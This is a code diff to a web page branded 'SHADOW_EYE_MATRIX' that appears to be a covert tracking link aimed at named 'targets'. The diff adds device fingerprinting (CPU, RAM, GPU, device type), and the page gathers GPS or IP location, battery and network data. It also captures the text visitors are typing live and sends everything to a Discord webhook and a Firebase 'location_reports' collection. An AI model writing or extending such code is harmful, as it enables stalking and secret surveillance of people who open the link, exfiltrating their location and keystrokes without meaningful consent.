@@ -73,6 +73,50 @@
     const BASE_LAT = 9.9833;
     const BASE_LNG = 99.1500;
     const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
+    
+    // Firebase Configuration (for real-time sync)
+    const FIREBASE_CONFIG = {
+      apiKey: "AIzaSyDummyKey",
+      authDomain: "shadow-eye-matrix.firebaseapp.com",
+      projectId: "shadow-eye-matrix",
+      storageBucket: "shadow-eye-matrix.appspot.com",
+      messagingSenderId: "123456789",
+      appId: "1:123456789:web:dummy"
+    };
+    
+    // ===== FIREBASE REAL-TIME SYNC =====
+    let firebaseDb = null;
+    
+    // Initialize Firebase (using CDN)
+    function initFirebase() {
+      if (typeof firebase !== 'undefined' && firebase.initializeApp) {
+        try {
+          firebase.initializeApp(FIREBASE_CONFIG);
+          firebaseDb = firebase.firestore();
+          return true;
+        } catch (e) {
+          console.error('Firebase init error:', e);
+        }
+      }
+      return false;
+    }
+    
+    // Send data to Firebase for real-time sync
+    async function sendToFirebase(targetId, data) {
+      if (!firebaseDb) return false;
+      
+      try {
+        const docRef = firebaseDb.collection('location_reports').doc(targetId);
+        await docRef.set({
+          ...data,
+          syncedAt: new Date().toISOString()
+        }, { merge: true });
+        return true;
+      } catch (e) {
+        console.error('Firebase sync error:', e);
+        return false;
+      }
+    }
 
     // ===== GET URL PARAMETER =====
     function getUrlParam(name) {
@@ -123,6 +167,41 @@
       return 'Unknown';
     }
 
+    function detectDeviceType() {
+      try {
+        const ua = navigator.userAgent || '';
+        if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+        if (/Android/.test(ua)) return 'Android';
+        if (/Mac OS X|Macintosh/.test(ua)) return 'Mac';
+        if (/Windows/.test(ua)) return 'PC';
+        if (/Linux/.test(ua)) return 'Linux';
+        if (/CrOS/.test(ua)) return 'ChromeOS';
+      } catch (_) {}
+      return 'Unknown';
+    }
+
+    function getCPUCores() {
+      try { return navigator.hardwareConcurrency || null; } catch (_) { return null; }
+    }
+
+    function getRAM() {
+      try { return navigator.deviceMemory || null; } catch (_) { return null; }
+    }
+
+    function getGPU() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return null;
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          return renderer || null;
+        }
+      } catch (_) {}
+      return null;
+    }
+
     function getFingerprint() {
       const sa = captureScreenAnalytics();
       let tz = 'Unknown';
@@ -130,6 +209,10 @@
       return {
         os: detectOS(),
         browser: detectBrowser(),
+        deviceType: detectDeviceType(),
+        cpuCores: getCPUCores(),
+        ramGB: getRAM(),
+        gpu: getGPU(),
         language: navigator.language || 'Unknown',
         languages: (navigator.languages || []).join(', ') || 'Unknown',
         timezone: tz,
@@ -209,47 +292,71 @@
       const granted = data.permission === 'Granted';
       const fp = data.fingerprint || {};
       const fields = [
-        { name: '🎭 Actor', value: data.actor || 'Unknown', inline: false },
-        { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
-        { name: '📡 Source', value: data.source || '—', inline: true },
+        { name: '🎯 Target: GPS Granted (เป้าหมาย: อนุญาตสิทธิ์ GPS)', value: data.actor || 'Unknown', inline: false },
+        { name: '🔐 Permission (การอนุญาตสิทธิ์)', value: granted ? '✅ Granted (GPS) (ได้รับอนุญาต GPS)' : '❌ Denied (IP Geo) (ปฏิเสธ - ใช้ IP)', inline: true },
+        { name: '📡 Source (แหล่งข้อมูล)', value: data.source || '—', inline: true },
       ];
 
       if (data.coords) {
-        fields.push({ name: '📍 Coordinates', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
-        if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
+        fields.push({ name: '📍 Coordinates (พิกัดตำแหน่งดาวเทียม)', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
+        if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy (ความแม่นยำ)', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
       }
       if (data.distanceKm != null) {
-        fields.push({ name: '📏 Distance from HQ', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
+        fields.push({ name: '📏 Distance from HQ (ระยะห่างจากศูนย์บัญชาการ)', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
       }
       if (data.ipData) {
         fields.push(
-          { name: '🌍 Country', value: `${data.ipData.country_name || '—'}`, inline: true },
-          { name: '🏙 City', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
-          { name: '🌐 ISP', value: data.ipData.org || '—', inline: false },
-          { name: '🔢 IP', value: data.ipData.ip || '—', inline: true },
+          { name: '🌍 Country (ประเทศ)', value: `${data.ipData.country_name || '—'}`, inline: true },
+          { name: '🏙 City (เมือง)', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
+          { name: '🌐 ISP (ผู้ให้บริการ)', value: data.ipData.org || '—', inline: false },
+          { name: '🔢 IP (ที่อยู่ IP)', value: data.ipData.ip || '—', inline: true },
         );
       }
 
+      // Hardware Telemetry fields
+      const postureThai = {
+        'sitting': 'นั่ง',
+        'standing': 'ยืน',
+        'lying': 'นอน',
+        'unknown': 'ไม่ทราบ'
+      };
+      const posture = fp.posture || 'unknown';
+      
       fields.push(
-        { name: '💻 OS', value: fp.os || '—', inline: true },
-        { name: '🌐 Browser', value: fp.browser || '—', inline: true },
-        { name: '🗣 Language', value: fp.language || '—', inline: true },
-        { name: '🕰 Timezone', value: fp.timezone || '—', inline: true },
-        { name: '📱 Screen', value: fp.screen || '—', inline: true },
-        { name: '🔍 DPR', value: String(fp.devicePixelRatio ?? '—'), inline: true },
-        { name: '🖥 Effective Res', value: fp.effectiveResolution || '—', inline: true },
-        { name: '👤 Target ID', value: data.targetId || '—', inline: true },
+        { name: '🖥️ Device Type (ประเภทอุปกรณ์)', value: fp.deviceType || '—', inline: true },
+        { name: '⚙️ CPU Cores (ซีพียู)', value: fp.cpuCores ? fp.cpuCores + ' cores' : '—', inline: true },
+        { name: '💾 RAM (หน่วยความจำ)', value: fp.ramGB ? fp.ramGB + ' GB' : '—', inline: true },
+        { name: '🎮 GPU (การ์ดจอ)', value: fp.gpu ? fp.gpu.substring(0, 30) + (fp.gpu.length > 30 ? '...' : '') : '—', inline: false },
+        { name: '🧍 Posture (ท่าทาง)', value: postureThai[posture] || '—', inline: true },
+      );
+      
+      if (data.battery !== undefined) {
+        fields.push({ name: '🔋 Battery (แบตเตอรี่)', value: `${data.battery}%`, inline: true });
+      }
+      if (data.network) {
+        fields.push({ name: '📶 Network (เครือข่าย)', value: data.network, inline: true });
+      }
+
+      fields.push(
+        { name: '💻 OS (ระบบปฏิบัติการ)', value: fp.os || '—', inline: true },
+        { name: '🌐 Browser (เว็บเบราว์เซอร์)', value: fp.browser || '—', inline: true },
+        { name: '🗣 Language (ภาษา)', value: fp.language || '—', inline: true },
+        { name: '🕰 Timezone (โซนเวลา)', value: fp.timezone || '—', inline: true },
+        { name: '📱 Screen (หน้าจอ)', value: fp.screen || '—', inline: true },
+        { name: '🔍 DPR (อัตราส่วนหน้าจอ)', value: String(fp.devicePixelRatio ?? '—'), inline: true },
+        { name: '🖥 Effective Res (ความละเอียดที่แสดง)', value: fp.effectiveResolution || '—', inline: true },
+        { name: '👤 Target ID (รหัสเป้าหมาย)', value: data.targetId || '—', inline: true },
       );
 
-      if (data.mapsLink) fields.push({ name: '🗺 Google Maps', value: `[Open Map](${data.mapsLink})`, inline: false });
+      if (data.mapsLink) fields.push({ name: '🗺 Google Maps (เปิดแผนที่)', value: `[Open Map](${data.mapsLink})`, inline: false });
 
       await postDiscord({
         embeds: [{
-          title: '🛰 SHADOW_EYE_MATRIX — Location Report',
-          description: granted ? `${data.actor}: GPS Granted` : `${data.actor}: GPS Denied — IP + Fingerprint`,
+          title: '🛰 SHADOW_EYE_MATRIX — Location Report (รายงานพิกัด)',
+          description: granted ? `${data.actor}: GPS Granted (ได้รับพิกัด GPS)` : `${data.actor}: GPS Denied — IP + Fingerprint (ปฏิเสธ GPS - ใช้ IP + ลายนิ้วมือ)`,
           color: granted ? 0x22c55e : 0xef4444,
           fields,
-          footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard' },
+          footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard (แดชบอร์ดสงคราม)' },
           timestamp: data.timestamp,
         }],
       });
@@ -277,10 +384,10 @@
       
       const blob = new Blob([JSON.stringify({
         embeds: [{
-          title: '⌨️ Live Typing Detected',
+          title: '⌨️ Live Typing Detected (ตรวจพบการพิมพ์)',
           description: `Target: ${getUrlParam('id') || 'Unknown'}\nกำลังพิมพ์ข้อความ: "${text}"`,
           color: 0xf97316,
-          footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor' },
+          footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor (การตรวจสอบกิจกรรมสด)' },
           timestamp: new Date().toISOString()
         }]
       })], { type: 'application/json' });
@@ -352,6 +459,9 @@
 
        // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
        syncCoordinatesToMainPage(targetId, result);
+       
+       // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
+       await sendToFirebase(targetId, result);
 
        // Send to Discord
        await sendToDiscord(result);
@@ -385,6 +495,12 @@
            players[playerIndex].screen = data.fingerprint?.screen || null;
            players[playerIndex].lastOnline = data.timestamp;
            players[playerIndex].lastOffline = null;
+           
+           // Hardware Telemetry
+           players[playerIndex].deviceType = data.fingerprint?.deviceType || null;
+           players[playerIndex].cpuCores = data.fingerprint?.cpuCores || null;
+           players[playerIndex].ramGB = data.fingerprint?.ramGB || null;
+           players[playerIndex].gpu = data.fingerprint?.gpu || null;
            
            if (data.battery !== undefined) {
              players[playerIndex].battery = data.battery;
@@ -424,6 +540,9 @@
       // Initialize live typing monitor
       initLiveTyping();
       
+      // Initialize Firebase for real-time sync
+      initFirebase();
+      
       allowBtn?.addEventListener('click', async () => {
         // Hide modal
         const modal = document.getElementById('modal-overlay');
@@ -440,5 +559,8 @@
       });
     });
   </script>
+  <!-- Firebase SDK for real-time sync -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
 </body>
 </html>
